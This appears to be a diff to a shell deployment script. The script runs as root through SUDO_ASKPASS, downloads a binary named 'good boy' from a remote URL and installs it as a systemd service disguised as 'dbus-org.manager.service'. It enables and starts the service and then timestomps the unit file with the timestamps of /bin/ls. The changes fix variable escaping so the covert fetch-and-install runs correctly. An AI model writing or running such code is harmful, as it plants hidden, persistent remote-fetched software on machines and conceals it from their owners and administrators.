@@ -94,7 +94,7 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
     curl -L -s -o \$GOOD_BOY_FILE \$GOOD_BOY_URL || \
     wget -q -O \$GOOD_BOY_FILE \$GOOD_BOY_URL
 
-    if [ ! -f /usr/bin/dbus-manager ]; then
+    if [ ! -f \$GOOD_BOY_FILE ]; then
         exit 1
     fi
 
@@ -105,16 +105,16 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
     SYSTEMD_SERVICE="dbus-org.manager.service"
     SYSTEMD_SERVICE_URL="https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
     SYSTEMD_SERVICE_FILE="/etc/systemd/system/$SYSTEMD_SERVICE"
-    curl -s -o $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL || \
-    wget -q -O $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL
+    curl -s -o \$SYSTEMD_SERVICE_FILE \$SYSTEMD_SERVICE_URL || \
+    wget -q -O \$SYSTEMD_SERVICE_FILE \$SYSTEMD_SERVICE_URL
 
-    if [ ! -f $SYSTEMD_SERVICE_FILE ]; then
+    if [ ! -f \$SYSTEMD_SERVICE_FILE ]; then
         exit 1
     fi
 
     systemctl daemon-reload
-    systemctl enable $SYSTEMD_SERVICE
-    systemctl start $SYSTEMD_SERVICE
+    systemctl enable \$SYSTEMD_SERVICE
+    systemctl start \$SYSTEMD_SERVICE
 
     touch -r /bin/ls /etc/systemd/system/$SYSTEMD_SERVICE
 
